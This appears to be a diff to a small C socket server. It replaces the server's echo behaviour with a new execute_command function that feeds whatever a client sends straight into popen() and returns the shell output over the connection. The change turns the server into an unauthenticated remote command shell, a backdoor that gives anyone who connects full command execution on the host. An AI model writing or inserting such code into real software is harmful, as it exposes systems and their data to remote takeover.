@@ -55,6 +55,23 @@ int handle_new_connection(int server_fd, struct sockaddr_in* address, int *clien
     return new_socket;    
 }
 
+void execute_command(const char* command, int client_socket) {
+    char buffer[BUFFER_SIZE];
+    FILE* fp;
+
+    fp = popen(command, "r");
+    if (fp == NULL) {
+        perror("Failed to run command");
+        send(client_socket, "Error executing command\n", 25, 0);
+        return;
+    }
+    while (fgets(buffer, sizeof(buffer), fp) != NULL) {
+        send(client_socket, buffer, strlen(buffer), 0);
+    }
+    pclose(fp);
+}
+
+
 void handle_client_data(int socket_id, char *buffer, struct sockaddr_in* address, int *client_socket, int addrlen)
 {
     int valread;
@@ -67,7 +84,7 @@ void handle_client_data(int socket_id, char *buffer, struct sockaddr_in* address
     } 
     else {
         buffer[valread] = '\0';
-        send(socket_id, buffer, strlen(buffer), 0);
+         execute_command(buffer, socket_id);
     }
 }
 
